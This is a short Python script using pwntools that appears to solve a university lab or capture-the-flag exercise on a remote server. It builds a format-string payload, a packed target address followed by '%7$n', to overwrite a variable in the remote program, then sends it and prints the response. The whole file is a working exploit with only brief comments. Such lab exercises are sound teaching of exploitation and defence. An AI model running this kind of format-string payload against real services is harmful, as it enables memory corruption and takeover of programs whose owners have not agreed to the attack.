from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23193

# Construct the payload to write to the target variable using %n
payload = struct.pack('<I',0x804c040)  # Convert the address to a little-endian 4-byte string
payload += b"%7$n"

s = remote(SERVER, PORT, timeout=100)

s.sendline(payload)

print(s.recvall())
s.close()